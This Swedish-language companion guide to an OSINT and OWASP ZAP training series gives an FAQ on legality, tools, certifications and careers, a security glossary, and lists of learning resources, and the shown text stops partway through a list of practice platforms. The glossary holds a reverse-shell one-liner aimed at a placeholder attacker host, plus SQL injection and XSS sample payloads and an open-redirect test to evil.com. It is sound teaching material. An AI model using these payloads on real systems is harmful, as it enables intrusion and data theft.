# 📚 Extra: FAQ, Ordlista, Resurser & Självutvärdering

> **Kompletterande guide till OSINT & ZAP-serien**
>
> 📚 Innehåll: FAQ | Ordlista | Resurser | Självutvärdering

---

## 🗺️ Navigation
**[🏠 Tillbaka till Översikt](OSINT_ZAP_Guide_README.md)**

---

## ❓ FAQ - Vanliga Frågor

### 1. Är det lagligt att göra OSINT och pentesting?

**Svar:**

✅ **OSINT:** Ja, att samla **publik** information är lagligt. Men:
- ⚠️ Använd inte informationen för trakasserier, stalking eller andra brott
- ⚠️ Respektera GDPR när du hanterar personuppgifter
- ⚠️ Vissa webbplatser kan ha Terms of Service som förbjuder scraping

✅ **Penetrationstestning:** Endast med **skriftligt tillstånd**!
- ❌ **Aldrig** testa system du inte äger eller har tillstånd att testa
- ✅ Testa dina egna system
- ✅ Testa med explicit skriftligt tillstånd (pentesting-kontrakt)
- ✅ Använd lagliga testmiljöer (DVWA, Juice Shop, HackTheBox)

**Svensk lag:**
- **Dataintrång (BrB 4:9c):** Olovlig åtkomst till IT-system = brott
- **Dataskadegörelse (BrB 12:2):** Skada/förstöra data = brott
- **Hemlig avlyssning (BrB 4:9a):** Avlyssna trafik = brott

**Bottom line:** Få alltid tillstånd, dokumentera det, och var etisk!

---

### 2. Vilka verktyg behöver jag installera för att komma igång?

**Svar:**

**Rekommenderad setup för nybörjare:**

**Option 1: Kali Linux (Enklast!)**
```bash
# Ladda ner Kali Linux VM
https://www.kali.org/get-kali/#kali-virtual-machines

# Alla verktyg förinstallerade:
- OWASP ZAP
- Burp Suite
- Nmap
- Wireshark
- Maltego
- theHarvester
- Metasploit
- John the Ripper
- ... och 600+ andra verktyg
```

**Option 2: Windows/Mac med Docker**
```bash
# Installera Docker Desktop
# Kör OWASP ZAP i Docker:
docker run -p 8080:8080 -p 8090:8090 owasp/zap2docker-stable zap-webswing.sh

# Kör DVWA (test-app):
docker run -d -p 80:80 vulnerables/web-dvwa

# Kör Kali Linux i Docker:
docker run -it kalilinux/kali-rolling
```

**Option 3: Minimalt på din nuvarande dator**
```bash
# Windows/Mac/Linux
1. OWASP ZAP: https://www.zaproxy.org/download/
2. Python 3.x: https://www.python.org/downloads/
3. Git: https://git-scm.com/downloads
4. Burp Suite Community: https://portswigger.net/burp/communitydownload

# Python-paket:
pip install requests beautifulsoup4 scrapy shodan
```

**Rekommendation:** Börja med Kali Linux VM för enklaste upplevelsen!

---

### 3. Hur mycket programmering behöver jag kunna?

**Svar:**

Det beror på nivån:

**Nivå 1-2 (Grundläggande OSINT & ZAP):**
- ✅ **Ingen programmering krävs!**
- Du använder grafiska verktyg (ZAP GUI, Maltego, webbläsare)
- Kan vara bra att kunna läsa lite HTML

**Nivå 3-4 (Avancerat):**
- 🟡 **Lite Python är bra att kunna**
- Kunna köra färdiga scripts
- Förstå grundläggande syntax (if, for, functions)
- Kan modifiera enkla scripts

**Nivå 5 (Expert):**
- 🟠 **Python-kunskap rekommenderas starkt**
- Kunna skriva egna automation scripts
- API-integration
- Kunna läsa och modifiera kod

**Lär dig Python på vägen:**
```python
# 20 minuter: Grunderna
https://www.learnpython.org/

# 2 timmar: Python för säkerhet
https://www.youtube.com/watch?v=WGJJIrtnfpk

# Övning: Skriv ett enkelt port scanner
import socket

def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

# Testa
if scan_port("127.0.0.1", 80):
    print("Port 80 är öppen!")
```

---

### 4. Hur lång tid tar det att lära sig allt?

**Svar:**

**Realistisk tidslinje:**

```
NIVÅ 1: Introduktion (2-4 timmar)
├─ Läsning: 1-2 timmar
├─ Övningar: 1-2 timmar
└─ Totalt: 2-4 timmar

NIVÅ 2: Grundläggande ZAP (3-5 timmar)
├─ Läsning: 1.5-2 timmar
├─ Övningar: 1.5-3 timmar
└─ Totalt: 3-5 timmar

NIVÅ 3: Tekniska Verktyg (5-8 timmar)
├─ Läsning: 2-3 timmar
├─ Övningar: 3-5 timmar
└─ Totalt: 5-8 timmar

NIVÅ 4: Avancerat (8-12 timmar)
├─ Läsning: 3-4 timmar
├─ Övningar: 5-8 timmar
└─ Totalt: 8-12 timmar

NIVÅ 5: Expert (15-25 timmar)
├─ Läsning: 4-6 timmar
├─ Övningar: 6-10 timmar
├─ Projekt: 5-9 timmar
└─ Totalt: 15-25 timmar

═══════════════════════════════════════════
TOTAL TID: 33-54 timmar
(Fördelat över 4-8 veckor = hanterbart!)
═══════════════════════════════════════════
```

**Rekommenderad approach:**
- 📅 **3-4 veckor:** 10-15 timmar/vecka = intensivt lärande
- 📅 **6-8 veckor:** 5-7 timmar/vecka = lagom tempo
- 📅 **3-6 månader:** 2-3 timmar/vecka = i din egen takt

**Efter guiderna:** Fortsatt lärande i 6-12 månader för att bli verkligt kompetent!

---

### 5. Behöver jag certifieringar för att jobba med säkerhet?

**Svar:**

**Nej, men de hjälper!**

**Utan certifieringar:**
- ✅ Bygg portfolio (GitHub, bug bounty, CTFs)
- ✅ Bidra till open source säkerhetsprojekt
- ✅ Skriv blog posts om säkerhetsanalyser
- ✅ Delta i CTF-tävlingar och visa resultat

**Med certifieringar:**
- ✅ Lättare att komma förbi HR/rekryterare
- ✅ Bevisar strukturerad kunskap
- ✅ Högre startlön (ofta 10-20% mer)

**Rekommenderade certifieringar:**

```
ENTRY LEVEL (0-2 års erfarenhet)
══════════════════════════════════════════
🎓 CompTIA Security+
   Kostnad: ~$380
   Svårighetsgrad: Lätt-Medel
   Värde: ⭐⭐⭐

🎓 CEH (Certified Ethical Hacker)
   Kostnad: ~$1,200
   Svårighetsgrad: Medel
   Värde: ⭐⭐⭐⭐

INTERMEDIATE (2-5 års erfarenhet)
══════════════════════════════════════════
🎓 OSCP (Offensive Security Certified Professional)
   Kostnad: ~$1,650
   Svårighetsgrad: Svår
   Värde: ⭐⭐⭐⭐⭐ (Branschstandard!)

🎓 GWAPT (Web App Penetration Tester)
   Kostnad: ~$7,000 (inkl. kurs)
   Svårighetsgrad: Medel-Svår
   Värde: ⭐⭐⭐⭐

ADVANCED (5+ års erfarenhet)
══════════════════════════════════════════
🎓 OSWE (Offensive Security Web Expert)
   Kostnad: ~$1,650
   Svårighetsgrad: Mycket Svår
   Värde: ⭐⭐⭐⭐⭐

🎓 OSCE (Offensive Security Certified Expert)
   Kostnad: ~$1,650
   Svårighetsgrad: Extrem
   Värde: ⭐⭐⭐⭐⭐
```

**Bottom line:** Börja med praktisk erfarenhet, ta certifieringar när du känner dig redo!

---

### 6. Vad är skillnaden mellan Bug Bounty och Penetrationstesting?

**Svar:**

```
BUG BOUNTY HUNTING
══════════════════════════════════════════
🎯 Vad: Hitta sårbarheter i företags system
💰 Betalning: Per sårbarhet ($50-$50,000+)
📜 Tillstånd: Via bug bounty-plattform
⏰ Tid: När du vill (flexibelt)
🎓 Krav: Ingen formell utbildning
📊 Rapportering: Enkel vulnerability report
🏆 Exempel: HackerOne, Bugcrowd, Intigriti

För- och nackdelar:
✅ Flexibel arbetstid
✅ Inget företag, jobba hemma
✅ Hög potential belöning
❌ Oförutsägbar inkomst
❌ Mycket konkurrens
❌ Ingen garanti för betalning

PENETRATION TESTING
══════════════════════════════════════════
🎯 Vad: Fullständig säkerhetsaudit av system
💰 Betalning: Fast pris per projekt ($5k-$50k+)
📜 Tillstånd: Formellt pentest-kontrakt
⏰ Tid: Tidsbestämt projekt (1-4 veckor)
🎓 Krav: Ofta certifieringar (OSCP, CEH)
📊 Rapportering: Omfattande professionell rapport
🏆 Exempel: Konsultbolag, inhouse säkerhetsteam

För- och nackdelar:
✅ Stabil inkomst
✅ Professionell karriär
✅ Teamwork och lärande
❌ Formella krav (certifieringar)
❌ Fasta arbetstider
❌ Mer administrativa uppgifter
```

**Kan man göra både?** Ja! Många pentestare gör bug bounty på fritiden!

---

### 7. Vilka är de vanligaste misstagen som nybörjare gör?

**Svar:**

**❌ Top 10 Nybörjarmisstag:**

**1. Testa utan tillstånd**
```
Fel: "Jag ska bara testa min väns företag lite..."
Rätt: Få SKRIFTLIGT tillstånd först!
```

**2. Använda produktionssystem för test**
```
Fel: Köra Active Scan mot live webbplats
Rätt: Använd testmiljö (DVWA, staging-miljö)
```

**3. Fokusera bara på verktyg**
```
Fel: "Jag kan köra ZAP, jag är en hacker!"
Rätt: Förstå VARFÖR verktygen gör vad de gör
```

**4. Hoppa över grunderna**
```
Fel: Börja direkt med Metasploit och exploits
Rätt: Lär dig HTTP, DNS, nätverk FÖRST
```

**5. Inte dokumentera**
```
Fel: Hitta sårbarheter men glömma hur
Rätt: Dokumentera ALLT (screenshots, kommandon)
```

**6. Ge upp för snabbt**
```
Fel: "Jag hittar inga sårbarheter, jag suger..."
Rätt: Säkerhet är svårt, ta det steg för steg!
```

**7. Ignorera false positives**
```
Fel: Rapportera alla ZAP-alerts direkt
Rätt: Verifiera MANUELLT först
```

**8. Dålig rapportering**
```
Fel: "Det finns en XSS på /login"
Rätt: Detaljerad rapport med PoC, impact, fix
```

**9. Inte hålla sig uppdaterad**
```
Fel: Läsa 5 år gamla tutorials
Rätt: Följ aktuella bloggar, Twitter, CVE-listor
```

**10. Bryta mot etiken**
```
Fel: "Jag hittar sårbarheter för att visa hur duktig jag är"
Rätt: Responsible disclosure, hjälpa företag bli säkrare
```

---

### 8. Hur hittar jag min första sårbarhet?

**Svar:**

**Steg-för-steg guide:**

**Steg 1: Välj rätt target** (1 dag)
```
Börja INTE med:
❌ Google, Facebook, Microsoft (för svårt)
❌ Banker (juridiskt riskabelt)
❌ Slumpmässiga webbplatser (olagligt!)

Börja med:
✅ HackerOne Public Programs (explicita policies)
✅ Bugcrowd (liknande)
✅ Själv-hostade testappar (DVWA, Juice Shop)
✅ Din egen webbplats
```

**Steg 2: Reconnaissance** (2-3 dagar)
```
1. Subdomains: Hitta alla subdomains (amass, subfinder)
2. Technology: Identifiera tech stack (Wappalyzer, BuiltWith)
3. Endpoints: Kartlägg alla endpoints (ZAP Spider, Burp)
4. Parameters: Hitta alla input-fält
```

**Steg 3: Low-hanging fruit** (1 vecka)
```
Testa för enkla sårbarheter först:

✅ Missing Security Headers
   - X-Frame-Options, CSP, HSTS
   - Enkelt att hitta, låg impact men räknas!

✅ Subdomain Takeover
   - Leta efter DNS records som pekar på borttagna tjänster
   - Medel-hög impact

✅ Open Redirects
   - Test: ?redirect=https://evil.com
   - Medel impact

✅ Information Disclosure
   - Exponerade .git folders
   - /admin panels utan autentisering
   - Debug-info i errors
```

**Steg 4: Djupare testning** (2-4 veckor)
```
✅ XSS (Cross-Site Scripting)
   - Testa ALLA input-fält
   - Prova olika payloads
   - Bypass filters

✅ IDOR (Insecure Direct Object References)
   - /api/users/123 → /api/users/124
   - Kan du se andras data?

✅ CSRF (Cross-Site Request Forgery)
   - Saknas CSRF-tokens?
   - Kan du utföra actions utan consent?
```

**Steg 5: Rapportera!**
```
När du hittar något:

1. Verifiera att det verkligen är en sårbarhet
2. Testa impact (vad kan attackers göra?)
3. Ta screenshots/video som PoC
4. Skriv tydlig rapport:
   - Title
   - Description
   - Steps to Reproduce
   - Impact
   - Suggested Fix

5. Skicka via rätt kanal (bug bounty platform)
6. Vänta tåligt på svar (kan ta dagar-veckor)
```

**Förväntningar:**
- 🎯 **Första månad:** Många duplicates, false positives
- 🎯 **Efter 3 månader:** Första accepterade rapporten
- 🎯 **Efter 6 månader:** Regelbundna fynd
- 🎯 **Efter 1 år:** Konsekvent framgång

**Exempel på första bounty:**
```
Mitt första fynd: Open Redirect
Company: Mindre startup på HackerOne
Sårbarhet: Öppen redirect via ?next= parameter
Bounty: $150
Tid: 2 månaders letande
Känsla: OVÄRDERLIG! 🎉
```

---

### 9. Vilka företag anställer säkerhetsspecialister?

**Svar:**

**Typ av företag:**

**1. Säkerhetskonsulter** ⭐⭐⭐⭐⭐
```
Exempel (Sverige):
- Clavister
- Truesec
- Assured
- Sentor
- Outpost24
- Detectify

Roller:
- Penetration Tester
- Security Consultant
- Red Team Operator
- Security Researcher

Fördelar:
✅ Varierande uppdrag
✅ Lär dig massor
✅ Bra lön (450k-700k SEK/år)
✅ Respekterad karriär
```

**2. Techbolag** ⭐⭐⭐⭐
```
Exempel (Sverige):
- Spotify
- Klarna
- King
- Ericsson
- Schibsted

Roller:
- Application Security Engineer
- Product Security Engineer
- Security Operations
- Threat Intelligence Analyst

Fördelar:
✅ Hög lön (500k-900k+ SEK/år)
✅ Modern tech stack
✅ Internationell miljö
```

**3. Banker & Finans** ⭐⭐⭐⭐
```
Exempel:
- Swedbank
- SEB
- Nordea
- Handelsbanken

Roller:
- Information Security Analyst
- Cyber Security Specialist
- Security Architect

Fördelar:
✅ Mycket hög lön (550k-800k SEK/år)
✅ Stabil arbetsgivare
✅ Kritisk infrastruktur
```

**4. Myndigheter** ⭐⭐⭐
```
Exempel:
- FRA (Försvarets Radioanstalt)
- MUST (Militära Underrättelse)
- Säkerhetspolisen
- MSB (Myndigheten för Samhällsskydd)

Roller:
- IT-säkerhetsspecialist
- Cyber Defence Operator
- Threat Analyst

Fördelar:
✅ Meningsfullt arbete
✅ Säkerhetsprövning (prestige)
✅ Unik erfarenhet
```

**5. Bug Bounty Platforms** ⭐⭐⭐⭐
```
Exempel:
- Bugcrowd (anställ säkerhetsforskare)
- HackerOne (Triage, researcher ops)
- Synack (Managed pentesting)

Roller:
- Triage Analyst
- Security Researcher
- Red Team Lead

Fördelar:
✅ Flexibilitet
✅ Remote work
✅ Community
```

**Lönespann (Sverige, 2024):**
```
Junior (0-2 år):     400k - 500k SEK/år
Medior (2-5 år):     500k - 650k SEK/år
Senior (5-10 år):    650k - 850k SEK/år
Expert (10+ år):     800k - 1,200k+ SEK/år
```

---

### 10. Hur fortsätter jag utvecklas efter dessa guider?

**Svar:**

**Din utvecklingsplan (6-12 månader):**

**Månad 1-2: Practical Training**
```
✅ TryHackMe
   - Complete paths: Jr Penetration Tester
   - https://tryhackme.com/

✅ HackTheBox
   - Start med "Starting Point"
   - 10 retired easy boxes
   - https://hackthebox.com/

✅ PortSwigger Web Security Academy
   - Alla labs (gratis!)
   - https://portswigger.net/web-security
```

**Månad 3-4: Bug Bounty Start**
```
✅ Välj 3-5 program på HackerOne/Bugcrowd
✅ Spendera 2-3 timmar/dag på reconnaissance
✅ Fokusera på 1-2 sårbarhetstyper (t.ex. XSS + IDOR)
✅ Rapportera dina första fynd (även om triaged/duplicated)
```

**Månad 5-6: Certifiering (valfritt)**
```
✅ Börja studera för CEH eller OSCP
✅ Praktikaövningar dagligen
✅ Lab environments (PWK labs för OSCP)
```

**Månad 7-9: Specialisering**
```
Välj ett område och bli expert:

🔹 Web Application Security
   - OWASP Top 10
   - API security
   - Cloud security

🔹 Mobile Security
   - iOS pentesting
   - Android reversing

🔹 Cloud Security
   - AWS/Azure/GCP
   - Container security

🔹 Network Security
   - Internal pentesting
   - Active Directory

🔹 Red Teaming
   - Social engineering
   - Physical security
   - Full adversary simulation
```

**Månad 10-12: Community & Giving Back**
```
✅ Starta en säkerhetsblog
✅ Presentera på lokala meetups
✅ Bidra till open source säkerhetsverktyg
✅ Mentorskap för nybörjare
✅ Skriva CVE-rapporter
```

**Kontinuerligt lärande:**
```
📺 YouTube Kanaler:
   - IppSec (HTB walkthroughs)
   - LiveOverflow
   - John Hammond
   - Nahamsec (Bug Bounty)
   - STÖK (Bug Bounty)

📝 Bloggar:
   - PortSwigger Daily Swig
   - Krebs on Security
   - Troy Hunt
   - Detectify Labs

🐦 Twitter:
   - @0xdea, @stokfredrik, @nahamsec
   - @jhaddix, @thecybermentor
   - @bugcrowd, @hackerone

🎙️ Podcasts:
   - Darknet Diaries
   - The Cyberwire
   - Defensive Security Podcast
```

**Bottom line:** Säkerhet är en resa, inte ett mål. Fortsätt lära dig varje dag! 🚀

---

## 📖 Ordlista - Svenska/Engelska Termer

### A-E

**1. Active Scan / Aktiv Skanning**
```
Svenska: Automatiserad säkerhetstest där verktyget aktivt
         skickar exploits och payloads för att hitta sårbarheter
Engelska: Active Scan
Exempel: ZAP Active Scan testar för SQL Injection genom att
         skicka payloads som ' OR '1'='1
```

**2. API (Application Programming Interface)**
```
Svenska: Applikationsprogrammeringsgränssnitt - hur program
         kommunicerar med varandra
Engelska: API
Exempel: REST API, GraphQL API, SOAP API
```

**3. Attack Surface / Attackyta**
```
Svenska: Alla punkter där en attackerare kan försöka komma in i system
Engelska: Attack Surface
Exempel: Öppna portar, webbformulär, API-endpoints, exponerade admin-paneler
```

**4. Authentication / Autentisering**
```
Svenska: Processen att verifiera att du är den du säger att du är
Engelska: Authentication
Exempel: Lösenord, 2FA, biometri
Skillnad från Authorization: Authentication = VEM är du?
                             Authorization = VAD får du göra?
```

**5. Authorization / Auktorisering**
```
Svenska: Processen att verifiera vad en autentiserad användare får göra
Engelska: Authorization
Exempel: Admin får radera användare, vanlig användare får inte
```

**6. Brute Force / Brute Force-attack**
```
Svenska: Prova alla möjliga kombinationer tills rätt hittas
Engelska: Brute Force Attack
Exempel: Testa 1 miljon lösenord på en login-form
```

**7. Bug Bounty / Buggjägarprogram**
```
Svenska: Program där företag betalar för rapporterade sårbarheter
Engelska: Bug Bounty Program
Exempel: HackerOne, Bugcrowd
Betalning: $50 - $50,000+ beroende på severity
```

**8. CI/CD (Continuous Integration/Continuous Deployment)**
```
Svenska: Kontinuerlig integration och driftsättning - automatiserad
         pipeline från kod till produktion
Engelska: CI/CD Pipeline
Exempel: GitHub Actions, GitLab CI, Jenkins
```

**9. CSRF (Cross-Site Request Forgery)**
```
Svenska: Cross-Site Request Forgery - tvinga användare att utföra
         oönskade actions
Engelska: CSRF / XSRF / Sea-Surf
Exempel: Skadlig länk som överför pengar när offret klickar
```

**10. CVE (Common Vulnerabilities and Exposures)**
```
Svenska: Standardiserat ID för kända sårbarheter
Engelska: CVE
Exempel: CVE-2014-0160 (Heartbleed)
Format: CVE-YYYY-NNNNN
```

**11. DevSecOps**
```
Svenska: Development + Security + Operations - integrera säkerhet
         i hela utvecklingsprocessen
Engelska: DevSecOps
Princip: "Security as Code" - säkerhet från dag 1
```

**12. DNS (Domain Name System)**
```
Svenska: Domännamnssystem - översätter domännamn till IP-adresser
Engelska: DNS
Exempel: google.com → 142.250.185.46
```

**13. Enumeration / Enumeration**
```
Svenska: Systematiskt samla information om ett target
Engelska: Enumeration
Exempel: Subdomain enumeration, user enumeration, port enumeration
```

**14. Exploit / Exploit**
```
Svenska: Kod eller metod för att utnyttja en sårbarhet
Engelska: Exploit
Exempel: Metasploit exploit för EternalBlue
```

### F-O

**15. False Positive / Falskt Positivt**
```
Svenska: När ett säkerhetsverktyg rapporterar en sårbarhet som inte finns
Engelska: False Positive
Exempel: ZAP rapporterar XSS men input är faktiskt sanitized
Viktigt: Verifiera ALLTID manuellt!
```

**16. Fuzzing / Fuzzing**
```
Svenska: Testa med massa olika (ofta random) inputs för att hitta buggar
Engelska: Fuzzing
Exempel: Skicka 10,000 olika XSS-payloads till ett input-fält
```

**17. IDOR (Insecure Direct Object References)**
```
Svenska: Osäkra direkta objektreferenser - åtkomst till andras data
         genom att ändra ID
Engelska: IDOR
Exempel: /api/users/123 → /api/users/124 (se någon annans profil)
```

**18. IoC (Indicator of Compromise)**
```
Svenska: Indikator på intrång - tecken på att system är komprometterat
Engelska: IoC / Indicator of Compromise
Exempel: Känd skadlig IP, filhash från malware, misstänkt domän
```

**19. Man-in-the-Middle (MitM)**
```
Svenska: Man-i-mitten-attack - avlyssna kommunikation mellan två parter
Engelska: MitM / Man-in-the-Middle
Exempel: Avlyssna HTTP-trafik på öppet WiFi
```

**20. OSINT (Open Source Intelligence)**
```
Svenska: Öppen källunderrättelse - samla information från publika källor
Engelska: OSINT / Open Source Intelligence
Källor: Google, sociala medier, DNS, WHOIS, public databases
```

**21. OWASP (Open Web Application Security Project)**
```
Svenska: Open Web Application Security Project - community för säkerhet
Engelska: OWASP
Viktigt: OWASP Top 10 - de 10 vanligaste webbsårbarheterna
```

### P-Z

**22. Payload / Payload**
```
Svenska: Den skadliga koden/datan som skickas för att exploatera sårbarhet
Engelska: Payload
Exempel: <script>alert('XSS')</script> är en XSS-payload
```

**23. Penetration Testing / Penetrationstestning**
```
Svenska: Penetrationstestning - simulerad cyberattack för att hitta sårbarheter
Engelska: Pentesting / Penetration Testing
Faser: Reconnaissance, Scanning, Exploitation, Post-Exploitation, Reporting
```

**24. Reconnaissance / Spaning**
```
Svenska: Spaning - samla information om target före attack
Engelska: Reconnaissance / Recon
Typer: Passive (OSINT) och Active (scanning)
```

**25. Red Team / Röda Teamet**
```
Svenska: Röda teamet - simulerar verkliga attackerare för att testa försvar
Engelska: Red Team
Motsats: Blue Team (försvarare)
Purple Team: Red + Blue samarbete
```

**26. Responsible Disclosure / Ansvarsfull Avslöjande**
```
Svenska: Rapportera sårbarheter privat till företaget först,
         ge dem tid att fixa
Engelska: Responsible Disclosure
Process:
1. Hitta sårbarhet
2. Rapportera till företaget
3. Ge 90 dagar att fixa
4. Publicera efter fix (om önskat)
```

**27. Reverse Shell / Omvänt Skal**
```
Svenska: Omvänt skal - target-systemet ansluter tillbaka till attackerare
Engelska: Reverse Shell
Exempel: nc -e /bin/bash attacker-ip 4444
Skillnad från Bind Shell: I reverse shell initierar target anslutningen
```

**28. SAST (Static Application Security Testing)**
```
Svenska: Statisk applikationssäkerhetstestning - analysera kod utan att köra den
Engelska: SAST
Verktyg: Semgrep, Bandit, SonarQube
Motsats: DAST (Dynamic - testar körande app)
```

**29. Session Hijacking / Sessionskapning**
```
Svenska: Stjäla någons session för att bli inloggad som dem
Engelska: Session Hijacking
Exempel: Stjäla session cookie via XSS
```

**30. SQL Injection (SQLi)**
```
Svenska: SQL-injektion - manipulera databas-queries genom input
Engelska: SQL Injection / SQLi
Exempel: ' OR '1'='1'--
         → SELECT * FROM users WHERE username='' OR '1'='1'--
```

**31. Threat Intelligence / Hotinformation**
```
Svenska: Information om cyberhot - vem attackerar, hur, varför
Engelska: Threat Intelligence
Källor: MISP, VirusTotal, threat feeds, dark web monitoring
```

**32. Two-Factor Authentication (2FA)**
```
Svenska: Tvåfaktorsautentisering - kräver två bevis för inloggning
Engelska: 2FA / Two-Factor Authentication / MFA (Multi-Factor)
Faktorer:
1. Något du VET (lösenord)
2. Något du HAR (telefon, token)
3. Något du ÄR (fingeravtryck)
```

**33. Vulnerability / Sårbarhet**
```
Svenska: Sårbarhet - svaghet i system som kan exploateras
Engelska: Vulnerability
Severity: Critical, High, Medium, Low, Informational
```

**34. XSS (Cross-Site Scripting)**
```
Svenska: Cross-Site Scripting - injicera skadlig JavaScript i webbsida
Engelska: XSS
Typer:
- Reflected XSS (i URL, körs direkt)
- Stored XSS (sparas i databas)
- DOM-based XSS (client-side)
```

**35. Zero-Day**
```
Svenska: Noll-dagars-sårbarhet - okänd sårbarhet utan patch
Engelska: Zero-Day / 0-day
Värde: Väldigt högt (kan säljas för $100k-$1M+)
Risk: Ingen kan försvara sig mot okända sårbarheter
```

---

## 📚 Resurser för Fortsatt Lärande

### 📖 Böcker

#### Nybörjare (Nivå 1-2)
```
1. "The Web Application Hacker's Handbook" (2nd Edition)
   Författare: Dafydd Stuttard, Marcus Pinto
   Pris: ~$50
   Betyg: ⭐⭐⭐⭐⭐
   Varför: Bibeln för webbsäkerhet, täcker allt!

2. "OSINT Techniques: Resources for Uncovering Online Information"
   Författare: Michael Bazzell
   Pris: ~$25
   Betyg: ⭐⭐⭐⭐⭐
   Varför: Den bästa OSINT-boken, uppdateras årligen

3. "Penetration Testing: A Hands-On Introduction to Hacking"
   Författare: Georgia Weidman
   Pris: ~$40
   Betyg: ⭐⭐⭐⭐
   Varför: Praktisk guide för nybörjare
```

#### Intermediate (Nivå 3-4)
```
4. "Real-World Bug Hunting"
   Författare: Peter Yaworski
   Pris: ~$30
   Betyg: ⭐⭐⭐⭐⭐
   Varför: Verkliga bug bounty case studies

5. "Black Hat Python" (2nd Edition)
   Författare: Justin Seitz, Tim Arnold
   Pris: ~$40
   Betyg: ⭐⭐⭐⭐⭐
   Varför: Lär dig bygga egna hacking-verktyg

6. "The Hacker Playbook 3"
   Författare: Peter Kim
   Pris: ~$35
   Betyg: ⭐⭐⭐⭐
   Varför: Praktiska pentesting tekniker
```

#### Advanced (Nivå 5)
```
7. "Advanced Penetration Testing"
   Författare: Wil Allsopp
   Pris: ~$45
   Betyg: ⭐⭐⭐⭐⭐
   Varför: Red team operationer, social engineering

8. "Operator Handbook: Red Team + OSINT + Blue Team Reference"
   Författare: Joshua Picolet
   Pris: ~$25
   Betyg: ⭐⭐⭐⭐⭐
   Varför: Snabbreferens för alla kommandon

9. "Web Security Testing Cookbook"
   Författare: Paco Hope, Ben Walther
   Pris: ~$35
   Betyg: ⭐⭐⭐⭐
   Varför: Recept-baserad approach till testing
```

#### Svenska Böcker
```
10. "Säkerhet i IT-system och nätverk"
    Författare: Flera svenska forskare
    Pris: ~300 SEK
    Varför: På svenska, bra för grundläggande förståelse
```

---

### 🎓 Online Kurser

#### Gratis Kurser ✅
```
1. TryHackMe - Jr Penetration Tester Path
   URL: https://tryhackme.com/path/outline/jrpenetrationtester
   Tid: ~40 timmar
   Nivå: Nybörjare-Intermediate
   Innehåll: Web hacking, network security, Linux
   Kostnad: Gratis (Premium: $10/mån för extra rum)

2. PortSwigger Web Security Academy
   URL: https://portswigger.net/web-security
   Tid: ~60 timmar
   Nivå: Alla nivåer
   Innehåll: SQLi, XSS, CSRF, SSRF, XXE, etc.
   Kostnad: Helt gratis! ⭐⭐⭐⭐⭐

3. HackTheBox Academy - Introduction to Bug Bounty Hunting
   URL: https://academy.hackthebox.com/
   Tid: ~30 timmar
   Nivå: Intermediate
   Innehåll: Bug bounty metodik, reporting
   Kostnad: Gratis tier, Premium: $14/mån

4. OWASP Top 10 (Udacity)
   URL: https://www.udacity.com/course/web-security--ud602
   Tid: ~2 veckor
   Nivå: Nybörjare
   Kostnad: Gratis

5. Cybrary - Penetration Testing and Ethical Hacking
   URL: https://www.cybrary.it/
   Tid: Varierar
   Nivå: Alla nivåer
   Kostnad: Gratis grundkurser
```

#### Betalda Kurser 💰
```
6. Offensive Security - PWK/PEN-200 (OSCP)
   URL: https://www.offensive-security.com/pwk-oscp/
   Tid: 90 dagar lab access
   Nivå: Intermediate-Advanced
   Kostnad: ~$1,650
   Varför: Industrins guldstandard för pentesting
   Certifiering: OSCP (mycket respekterad!)

7. PentesterLab Pro
   URL: https://pentesterlab.com/pro
   Tid: Obegränsad
   Nivå: Alla nivåer
   Kostnad: $20/mån eller $200/år
   Varför: 100+ exercises, mycket praktiskt

8. INE Security - Web Application Penetration Testing
   URL: https://ine.com/learning/paths/web-application-penetration-testing
   Tid: ~40 timmar
   Nivå: Intermediate
   Kostnad: ~$500/år
   Varför: Omfattande web hacking kurs

9. Udemy - Practical Ethical Hacking (Heath Adams)
   URL: https://www.udemy.com/course/practical-ethical-hacking/
   Tid: ~25 timmar
   Nivå: Nybörjare-Intermediate
   Kostnad: ~$15-20 (vid rea)
   Varför: Bra pris/värde, praktiskt fokus

10. SANS SEC542 - Web App Penetration Testing
    URL: https://www.sans.org/cyber-security-courses/web-app-penetration-testing-ethical-hacking/
    Tid: 6 dagar
    Nivå: Advanced
    Kostnad: ~$8,000 (dyr men väldigt bra!)
    Certifiering: GWAPT
```

---

### 📺 YouTube Kanaler

#### OSINT
```
1. IntelTechniques (Michael Bazzell)
   Innehåll: OSINT-tekniker, privacy, sökning
   Subscribers: ~100k
   Rekommenderat: Alla OSINT-playlists

2. Nixintel
   Innehåll: OSINT case studies, geolocation
   Subscribers: ~50k
   Rekommenderat: "OSINT at Home" serien
```

#### Penetration Testing / Bug Bounty
```
3. IppSec
   Innehåll: HackTheBox walkthroughs
   Subscribers: ~400k
   Rekommenderat: Alla HTB-videos, perfekt för lärande
   URL: https://www.youtube.com/@ippsec

4. John Hammond
   Innehåll: CTF writeups, malware analysis, pentesting
   Subscribers: ~800k
   Rekommenderat: "Cyber Weapons Lab" serien
   URL: https://www.youtube.com/@JohnHammond

5. Nahamsec
   Innehåll: Bug bounty, OSINT, recon
   Subscribers: ~200k
   Rekommenderat: "Recon" playlists, intervjuer
   URL: https://www.youtube.com/@NahamSec

6. STÖK
   Innehåll: Bug bounty tips, hvordan hitta sårbarheter
   Subscribers: ~150k
   Rekommenderat: "Bug Bounty Reports Explained"
   URL: https://www.youtube.com/@STOKfredrik

7. LiveOverflow
   Innehålt: Web security, binary exploitation
   Subscribers: ~600k
   Rekommenderat: "Web Hacking" och "Binary Exploitation" serier
   URL: https://www.youtube.com/@LiveOverflow

8. The Cyber Mentor (Heath Adams)
   Innehåll: Pentesting, ethical hacking, karriärråd
   Subscribers: ~500k
   Rekommenderat: "Practical Ethical Hacking" kurs
   URL: https://www.youtube.com/@TCMSecurityAcademy
```

#### Allmänt Säkerhet
```
9. NetworkChuck
   Innehåll: Networking, Linux, cybersecurity basics
   Subscribers: ~3M
   Rekommenderat: Nybörjarvänligt innehåll
   URL: https://www.youtube.com/@NetworkChuck

10. Computerphile
    Innehåll: Djupgående tekniska förklaringar
    Subscribers: ~2M
    Rekommenderat: "Security" playlist
    URL: https://www.youtube.com/@Computerphile

11. Hak5
    Innehåll: Hacking-verktyg, tutorials
    Subscribers: ~1M
    Rekommenderat: "Hak5 Tools" serien
    URL: https://www.youtube.com/@hak5

12. David Bombal
    Innehåll: Networking, pentesting, intervjuer
    Subscribers: ~2M
    Rekommenderat: "Cybersecurity Career" videos
    URL: https://www.youtube.com/@davidbombal
```

---

### 🛠️ Verktyg & Plattformar

#### Practice Platforms
```
1. TryHackMe
   URL: https://tryhackme.com
